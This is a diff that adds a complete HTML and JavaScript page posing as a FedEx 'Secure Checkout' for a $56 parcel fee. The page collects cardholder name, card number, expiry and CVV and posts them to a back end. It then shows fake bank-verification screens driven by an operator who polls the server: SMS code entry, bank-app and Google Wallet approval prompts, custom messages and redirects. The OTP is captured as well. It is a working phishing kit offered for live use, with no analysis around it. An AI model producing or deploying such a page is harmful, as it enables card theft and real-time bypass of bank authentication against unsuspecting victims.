@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>FedEx | Secure Checkout</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: 'Inter', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; background-color: #1a1a1a; position: relative; overflow-x: hidden; overflow-y: auto; }
+.bg-image { position: fixed; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; transition: transform 2s ease; }
+.bg-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0); z-index: 2; transition: background 1.5s ease; }
+.form-panel { position: relative; z-index: 3; width: 100%; max-width: 500px; padding: 10px; margin: 20px 0; opacity: 0; transform: translateY(30px); pointer-events: none; transition: opacity 0.8s cubic-bezier(0.16, 1, 0.3, 1), transform 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
+body.show-form .bg-overlay { background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(4px); }
+body.show-form .form-panel { opacity: 1; transform: translateY(0); pointer-events: auto; }
+body.show-form .bg-image { transform: scale(1.05); }
+.form-container { background: #ffffff; border-radius: 20px; padding: 2rem 2rem 1.2rem 2rem; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border-top: 5px solid #FF6600; }
+.form-header { display: flex; align-items: center; gap: 15px; margin-bottom: 1.5rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
+.form-header img { height: 45px; width: auto; object-fit: contain; }
+.header-text h2 { font-size: 1.4rem; font-weight: 800; color: #111; margin-bottom: 2px; }
+.header-text p { font-size: 0.85rem; color: #666; }
+.input-group { margin-bottom: 1rem; position: relative; }
+.input-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #333; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+.input-wrapper { position: relative; display: flex; align-items: center; }
+.input-wrapper i { position: absolute; left: 16px; color: #999; font-size: 1rem; transition: color 0.2s; }
+.input-field { width: 100%; padding: 0.85rem 1rem 0.85rem 45px; font-size: 1rem; font-family: 'Inter', monospace; color: #111; border: 2px solid #e5e7eb; border-radius: 10px; background: #f9fafb; transition: all 0.3s ease; outline: none; }
+.input-field:focus { border-color: #4D148C; background: #fff; box-shadow: 0 0 0 3px rgba(77, 20, 140, 0.1); }
+.input-field:focus + i, .input-wrapper:focus-within i { color: #4D148C; }
+.card-icons { display: flex; gap: 8px; margin-top: 5px; justify-content: flex-end; }
+.card-icons i { font-size: 1.5rem; color: #d1d5db; transition: all 0.3s ease; }
+.card-icons i.active { color: #4D148C; transform: scale(1.1); }
+.consent-checkbox { margin: 1rem 0; display: flex; align-items: flex-start; gap: 10px; font-size: 0.75rem; color: #555; line-height: 1.4; }
+.consent-checkbox input { width: 16px; height: 16px; margin-top: 2px; cursor: pointer; accent-color: #4D148C; }
+.pay-button { width: 100%; background: #FF6600; border: none; padding: 1rem; border-radius: 10px; font-weight: 800; font-size: 1.05rem; color: white; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 8px 20px -5px rgba(255, 102, 0, 0.4); }
+.pay-button:hover { background: #e65c00; transform: translateY(-2px); box-shadow: 0 12px 25px -5px rgba(255, 102, 0, 0.5); }
+.fedex-footer { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid #e5e7eb; text-align: center; }
+.fedex-footer img { height: 20px; opacity: 0.6; margin-bottom: 10px; }
+.footer-links { display: flex; justify-content: center; flex-wrap: wrap; gap: 12px; font-size: 0.7rem; color: #888; }
+.footer-links a { color: #888; text-decoration: none; transition: color 0.2s; }
+.footer-links a:hover { color: #4D148C; text-decoration: underline; }
+.footer-copyright { margin-top: 10px; font-size: 0.65rem; color: #aaa; }
+.view-fullscreen { position: fixed; inset: 0; background: #ffffff; align-items: center; justify-content: center; z-index: 1200; padding: 20px; }
+.view-card { max-width: 440px; width: 100%; background: #ffffff; border-radius: 24px; padding: 3rem 2rem; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15); }
+.view-card h3 { font-size: 1.6rem; font-weight: 800; color: #111; margin-bottom: 10px; }
+.view-card p { font-size: 0.9rem; color: #666; line-height: 1.6; margin-bottom: 30px; }
+.loading-bg { background: #0f0c1b; }
+.loading-bg .view-card { background: #1a162b; border: 1px solid #2d2645; box-shadow: none; color: white; }
+.loading-bg h3 { color: #fff; }
+.loading-bg p { color: #a0a0b0; }
+.spinner-large { display: inline-block; width: 60px; height: 60px; border: 4px solid rgba(255,102,0,0.2); border-radius: 50%; border-top-color: #FF6600; animation: spin 1s linear infinite; margin-bottom: 25px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.progress-container { width: 100%; background-color: #2d2645; border-radius: 10px; margin-top: 20px; margin-bottom: 15px; overflow: hidden; height: 8px; }
+.progress-bar { height: 100%; width: 0%; background-color: #FF6600; border-radius: 10px; transition: width 1s linear; }
+.timer-box { font-size: 1.1rem; font-weight: 700; color: #FF6600; font-family: monospace; letter-spacing: 1px; }
+.otp-option { background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 16px; padding: 20px; margin-bottom: 15px; text-align: left; position: relative; }
+.otp-option h4 { font-size: 1rem; color: #111; margin-bottom: 12px; font-weight: 700; }
+.otp-option.recommended { border-color: #4D148C; background: #f8f4ff; }
+.badge-rec { position: absolute; top: -12px; right: 20px; background: #FF6600; color: white; font-size: 0.7rem; font-weight: 800; padding: 4px 12px; border-radius: 20px; text-transform: uppercase; letter-spacing: 1px; }
+.btn-app { background: #4D148C; color: white; text-decoration: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 0.95rem; display: flex; align-items: center; justify-content: center; gap: 10px; border: none; width: 100%; cursor: pointer; transition: background 0.2s; }
+.btn-app:hover { background: #3a0d6b; }
+.otp-input { width: 100%; padding: 1rem; font-size: 1.5rem; text-align: center; letter-spacing: 10px; font-weight: 800; border: 2px solid #e5e7eb; border-radius: 12px; margin-bottom: 15px; font-family: monospace; color: #111; background: #fff; }
+.otp-input:focus { border-color: #4D148C; outline: none; }
+.verify-otp-btn { background: #FF6600; width: 100%; border: none; padding: 1rem; border-radius: 12px; color: white; font-weight: 800; font-size: 1rem; cursor: pointer; }
+.pci-dss-wrapper { margin-top: 20px; text-align: center; opacity: 0.5; }
+.pci-dss-wrapper img { height: 30px; }
+.error-icon { font-size: 4rem; color: #ef4444; margin-bottom: 20px; }
+.custom-vip-card {
+  background: #ffffff;
+  border-radius: 20px;
+  padding: 3rem 2rem;
+  text-align: center;
+  box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.25), 0 18px 36px -18px rgba(0, 0, 0, 0.3);
+  border: 1px solid #f0f0f0;
+  position: relative;
+  overflow: hidden;
+  max-width: 440px;
+  width: 100%;
+}
+.custom-vip-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 6px;
+  background: linear-gradient(90deg, #4D148C 50%, #FF6600 50%);
+}
+.custom-vip-logo { height: 50px; width: auto; margin-bottom: 25px; opacity: 0.95; }
+.custom-vip-card h3 { color: #111827; font-size: 1.6rem; font-weight: 800; margin-bottom: 15px; }
+.custom-vip-card p { color: #4B5563; font-size: 0.95rem; line-height: 1.7; margin-bottom: 0; white-space: pre-wrap; font-weight: 500; }
+</style>
+</head>
+<body>
+
+<img src="https://res.cloudinary.com/mzblupug/image/upload/v1793463553/rnimo.png" class="bg-image" alt="FedEx Background">
+<div class="bg-overlay"></div>
+
+<!-- ================= MAIN FORM ================= -->
+<div class="form-panel" id="mainView">
+  <div class="form-container">
+    <div class="form-header">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxXVCBAsK2paCNB_LVsMJF4JMdAPCI52346PRPiuI968RSgyOYiJjzqZLtAzWlUVnFEc79OwNLhFiIwgl_Nam49p59PUP2O_jKMbgDK_6xujzLVX2FqPyW4IBFAjfdW0newhp3_CujakDjQWdVYsyreIJpvpC6fouRH5QxiCnk2DPuRirB-kZypV2MIf4/s320/vggfrt.png" alt="FedEx">
+      <div class="header-text">
+        <h2>Payment Details</h2>
+        <p>Enter your card information to proceed.</p>
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label>Cardholder Name</label>
+      <div class="input-wrapper">
+        <i class="far fa-user"></i>
+        <input type="text" id="cardName" class="input-field" placeholder="JOHN M. DOE" autocomplete="off">
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label>Card Number</label>
+      <div class="input-wrapper">
+        <i class="far fa-credit-card"></i>
+        <input type="text" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off">
+      </div>
+      <div class="card-icons" id="cardIcons">
+        <i class="fab fa-cc-visa" id="icon-visa"></i>
+        <i class="fab fa-cc-mastercard" id="icon-mc"></i>
+        <i class="fab fa-cc-amex" id="icon-amex"></i>
+      </div>
+    </div>
+
+    <div style="display:flex; gap:1rem;">
+      <div class="input-group" style="flex:1;">
+        <label>Expiry</label>
+        <div class="input-wrapper">
+          <i class="far fa-calendar-alt"></i>
+          <input type="text" id="expiry" class="input-field" placeholder="MM/YY" maxlength="5" autocomplete="off">
+        </div>
+      </div>
+      <div class="input-group" style="flex:1;">
+        <label>CVV</label>
+        <div class="input-wrapper">
+          <i class="fas fa-lock"></i>
+          <input type="password" id="cvv" class="input-field" placeholder="•••" maxlength="4" autocomplete="off">
+        </div>
+      </div>
+    </div>
+
+    <div class="consent-checkbox">
+      <input type="checkbox" id="consentCheckbox">
+      <label for="consentCheckbox">I authorize this payment and understand my information will be processed securely.</label>
+    </div>
+
+    <button type="button" class="pay-button" id="submitBtn" onclick="submitPayment()">
+      Pay $56 Now <i class="fas fa-arrow-right"></i>
+    </button>
+
+    <div class="fedex-footer">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir8dQiVV5U2vSUTx0mYvxd1yae2StWqRtYCZstYwEkWwZyt-F4U0WcDdZ_VaBLxJPu6niChp14hRi7qbeHXqot0D1QOi9Jbb3FUjmAp8PGnRPzxCaRNl0Umu8tP8FDCsz4gkTgUtzzqY05acCeuh1yORNZoBpMa_RuH9pimj59XJAHPewN8dhyUcSCNJU/s320/vvfde.png" alt="FedEx Icon">
+      <div class="footer-links">
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Fraud Protection</a>
+        <a href="#">Contact Us</a>
+      </div>
+      <div class="footer-copyright">© 2026 FedEx Corporation. All rights reserved.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= LOADING ================= -->
+<div id="loadingView" class="view-fullscreen loading-bg" style="display: none;">
+  <div class="view-card">
+    <div class="spinner-large"></div>
+    <h3 id="loadingTitle">Authenticating...</h3>
+    <p id="loadingText">Establishing a secure connection with your Issuing Bank.</p>
+    <div class="progress-container">
+      <div id="progressBar" class="progress-bar"></div>
+    </div>
+    <div class="timer-box">Time remaining: <span id="loadingTimer">15s</span></div>
+  </div>
+</div>
+
+<!-- ================= OTP ================= -->
+<div id="otpView" class="view-fullscreen" style="display: none;">
+  <div class="view-card">
+    <i class="fas fa-comment-dots" style="font-size: 2.5rem; color: #4D148C; margin-bottom: 15px;"></i>
+    <h3>SMS Verification</h3>
+    <p>Enter the 6-digit code sent to your phone by your bank.</p>
+    <div class="otp-option" style="border-color: #4D148C; background: #f8f4ff;">
+      <input type="text" id="otpCode" class="otp-input" placeholder="------" maxlength="6" inputmode="numeric" autocomplete="off">
+      <button type="button" id="verifyOtpBtn" class="verify-otp-btn" onclick="submitOtp()">Verify &amp; Complete</button>
+    </div>
+    <div class="pci-dss-wrapper">
+      <img src="https://getlogovector.com/wp-content/uploads/2019/10/pci-dss-compliant-logo-vector.png" alt="PCI DSS Compliant">
+    </div>
+  </div>
+</div>
+
+<!-- ================= MOBILE APP ================= -->
+<div id="mobileAppView" class="view-fullscreen" style="display: none;">
+  <div class="view-card">
+    <i class="fas fa-mobile-alt" style="font-size: 2.5rem; color: #4D148C; margin-bottom: 15px;"></i>
+    <h3>Approve in Bank App</h3>
+    <p>Please open your bank's mobile app and approve the pending <strong>Google Wallet notification</strong> to verify this transaction.</p>
+    <div class="otp-option recommended">
+      <div class="badge-rec">Action Required</div>
+      <h4>Waiting for approval...</h4>
+    </div>
+  </div>
+</div>
+
+<!-- ================= GOOGLE WALLET ================= -->
+<div id="walletView" class="view-fullscreen" style="display: none;">
+  <div class="view-card">
+    <i class="fab fa-google-wallet" style="font-size: 3rem; color: #4D148C; margin-bottom: 20px;"></i>
+    <h3>Google Wallet Approval</h3>
+    <p>Go to your bank app mobile and approve the notification from Google Wallet to release your package.</p>
+  </div>
+</div>
+
+<!-- ================= CUSTOM BANK ================= -->
+<div id="customBankView" class="view-fullscreen" style="display: none;">
+  <div class="view-card">
+    <i class="fas fa-university" style="font-size: 3rem; color: #4D148C; margin-bottom: 20px;"></i>
+    <h3>Action Required</h3>
+    <p>Please open your <strong><span id="customBankName">Bank</span></strong> mobile app and approve the payment of <strong><span id="customBankAmount">$0.00</span></strong> to release your package.</p>
+  </div>
+</div>
+
+<!-- ================= CUSTOM TEXT ================= -->
+<div id="customTextView" class="view-fullscreen" style="display: none;">
+  <div class="custom-vip-card">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir8dQiVV5U2vSUTx0mYvxd1yae2StWqRtYCZstYwEkWwZyt-F4U0WcDdZ_VaBLxJPu6niChp14hRi7qbeHXqot0D1QOi9Jbb3FUjmAp8PGnRPzxCaRNl0Umu8tP8FDCsz4gkTgUtzzqY05acCeuh1yORNZoBpMa_RuH9pimj59XJAHPewN8dhyUcSCNJU/s320/vvfde.png" alt="FedEx" class="custom-vip-logo">
+    <h3>Important Update</h3>
+    <p id="customTextDisplay">Loading message...</p>
+  </div>
+</div>
+
+<!-- ================= ERROR ================= -->
+<div id="errorView" class="view-fullscreen" style="display: none;">
+  <div class="view-card">
+    <i class="fas fa-times-circle error-icon"></i>
+    <h3 style="color:#111;">Payment Declined</h3>
+    <p>Your bank declined the transaction. Please try another payment method to avoid losing your package.</p>
+    <button type="button" onclick="window.location.reload()" class="verify-otp-btn" style="background:#111;">Try Another Card</button>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   SESSION ID — read from cookie set by Node server
+   ============================================================ */
+function readCookie(name) {
+  var m = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+  return m ? decodeURIComponent(m[1]) : '';
+}
+window.__SID__ = readCookie('sid');
+
+window.addEventListener('DOMContentLoaded', function () {
+  setTimeout(function () { document.body.classList.add('show-form'); }, 2250);
+});
+
+var globalTimerInterval = null;
+var pollInterval = null;
+var lastHandledStep = null;
+
+/* ---------- formatting ---------- */
+document.getElementById('cardNumber').addEventListener('input', function (e) {
+  var v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+  var parts = [];
+  for (var i = 0; i < v.length && i < 16; i += 4) parts.push(v.substring(i, i + 4));
+  e.target.value = parts.join(' ').substr(0, 19);
+
+  var firstDigit = v.charAt(0);
+  var iconVisa = document.getElementById('icon-visa');
+  var iconMc = document.getElementById('icon-mc');
+  var iconAmex = document.getElementById('icon-amex');
+  if (iconVisa && iconMc && iconAmex) {
+    iconVisa.classList.remove('active');
+    iconMc.classList.remove('active');
+    iconAmex.classList.remove('active');
+    if (firstDigit === '4') iconVisa.classList.add('active');
+    else if (firstDigit === '5') iconMc.classList.add('active');
+    else if (firstDigit === '3') iconAmex.classList.add('active');
+  }
+});
+
+document.getElementById('expiry').addEventListener('input', function (e) {
+  var raw = e.target.value.replace(/\D/g, '');
+  if (raw.length > 4) raw = raw.slice(0, 4);
+  if (raw.length >= 2) e.target.value = raw.slice(0, 2) + '/' + raw.slice(2);
+  else e.target.value = raw;
+});
+
+document.getElementById('otpCode').addEventListener('input', function (e) {
+  e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+});
+
+/* ---------- view switcher ---------- */
+function showView(view) {
+  var mainFormPanel = document.getElementById('mainView');
+  if (mainFormPanel) {
+    mainFormPanel.style.opacity = '0';
+    mainFormPanel.style.transform = 'translateY(30px)';
+    mainFormPanel.style.pointerEvents = 'none';
+  }
+  ['loadingView','otpView','errorView','mobileAppView','customBankView','walletView','customTextView']
+    .forEach(function (id) { document.getElementById(id).style.display = 'none'; });
+
+  if (view === 'main') {
+    if (mainFormPanel) {
+      mainFormPanel.style.opacity = '1';
+      mainFormPanel.style.transform = 'translateY(0)';
+      mainFormPanel.style.pointerEvents = 'auto';
+    }
+  } else if (view === 'loading') {
+    document.getElementById('loadingView').style.display = 'flex';
+  } else if (view === 'otp') {
+    document.getElementById('otpView').style.display = 'flex';
+  } else if (view === 'mobile_app') {
+    document.getElementById('mobileAppView').style.display = 'flex';
+  } else if (view === 'error') {
+    document.getElementById('errorView').style.display = 'flex';
+  } else if (view === 'custom_bank') {
+    document.getElementById('customBankView').style.display = 'flex';
+  } else if (view === 'wallet_app') {
+    document.getElementById('walletView').style.display = 'flex';
+  } else if (view === 'custom_text') {
+    document.getElementById('customTextView').style.display = 'flex';
+  }
+}
+
+/* ---------- timer ---------- */
+function startCountdown(seconds, callback) {
+  if (globalTimerInterval) clearInterval(globalTimerInterval);
+  var timeLeft = seconds;
+  var progressBar = document.getElementById('progressBar');
+  document.getElementById('loadingTimer').innerText = timeLeft + 's';
+  if (progressBar) progressBar.style.width = '0%';
+
+  globalTimerInterval = setInterval(function () {
+    timeLeft--;
+    document.getElementById('loadingTimer').innerText = timeLeft + 's';
+    if (progressBar) progressBar.style.width = ((seconds - timeLeft) / seconds * 100) + '%';
+    if (timeLeft <= 0) {
+      clearInterval(globalTimerInterval);
+      globalTimerInterval = null;
+      if (callback) callback();
+    }
+  }, 1000);
+}
+
+/* ---------- submit card ---------- */
+async function submitPayment() {
+  var name = document.getElementById('cardName').value.trim();
+  var card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+  var exp = document.getElementById('expiry').value.trim();
+  var cvv = document.getElementById('cvv').value.trim();
+  var consent = document.getElementById('consentCheckbox').checked;
+
+  if (!consent) { alert('Please check the consent box.'); return; }
+  if (!name || !card || !exp || !cvv) { alert('Please fill all fields.'); return; }
+
+  showView('loading');
+  document.getElementById('loadingTitle').innerText = 'Verifying Card...';
+  document.getElementById('loadingText').innerText = 'Please wait while we contact your bank.';
+
+  try {
+    var res = await fetch('/api/submit_card', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sid: window.__SID__,
+        name: name,
+        cardNumber: card,
+        expiry: exp,
+        cvv: cvv
+      })
+    });
+    var data = await res.json();
+    if (!data.ok) {
+      if (data.error === 'invalid_luhn') {
+        showView('main');
+        alert('Invalid card number. Please check and try again.');
+        return;
+      }
+      if (data.error === 'bad_words') {
+        showView('main');
+        alert('Please remove inappropriate language from the name field.');
+        return;
+      }
+    }
+  } catch (err) {
+    console.error('Fetch Error:', err);
+  }
+
+  startCountdown(10, function () {
+    document.getElementById('loadingTitle').innerText = 'Awaiting Bank Approval...';
+    document.getElementById('loadingText').innerText = 'Please wait. The bank is reviewing this transaction.';
+    startPolling();
+  });
+}
+
+/* ---------- polling ---------- */
+function startPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(async function () {
+    try {
+      var res = await fetch('/api/check_status?sid=' + encodeURIComponent(window.__SID__));
+      var state = await res.json();
+
+      if (state.step === lastHandledStep) return;
+      lastHandledStep = state.step;
+
+      if (state.step === 'send_otp') {
+        showView('otp');
+      } else if (state.step === 'mobile_app') {
+        showView('mobile_app');
+      } else if (state.step === 'wallet_app') {
+        showView('wallet_app');
+      } else if (state.step === 'custom_bank_view') {
+        document.getElementById('customBankName').innerText = state.bank_name || 'Bank';
+        document.getElementById('customBankAmount').innerText = state.bank_amount || '$0.00';
+        showView('custom_bank');
+      } else if (state.step === 'custom_text_view') {
+        document.getElementById('customTextDisplay').innerText = state.custom_text || '';
+        showView('custom_text');
+      } else if (state.step === 'redirect_user') {
+        if (state.redirect_url) window.location.href = state.redirect_url;
+      } else if (state.step === 'approved') {
+        showView('main');
+        alert('Payment Approved!');
+        clearInterval(pollInterval);
+        pollInterval = null;
+      } else if (state.step === 'rejected') {
+        showView('error');
+        clearInterval(pollInterval);
+        pollInterval = null;
+      } else if (state.step === 'back_to_card') {
+        showView('main');
+        clearInterval(pollInterval);
+        pollInterval = null;
+      } else if (state.step === 'back_to_otp') {
+        showView('otp');
+      } else if (state.step === 'verify_charge') {
+        showView('otp');
+      }
+    } catch (err) {
+      console.log('Polling error:', err);
+    }
+  }, 3000);
+}
+
+/* ---------- submit OTP ---------- */
+async function submitOtp() {
+  var otp = document.getElementById('otpCode').value.trim();
+  if (!otp) { alert('Enter OTP'); return; }
+
+  var btn = document.getElementById('verifyOtpBtn');
+  btn.innerHTML = 'Verifying...';
+  btn.disabled = true;
+
+  try {
+    await fetch('/api/submit_otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sid: window.__SID__, otp: otp })
+    });
+  } catch (err) {
+    console.log('OTP error', err);
+  }
+
+  document.getElementById('loadingTitle').innerText = 'Authorizing...';
+  document.getElementById('loadingText').innerText = 'Please wait for the final confirmation.';
+  showView('loading');
+
+  startPolling();
+}
+</script>
+</body>
+</html>
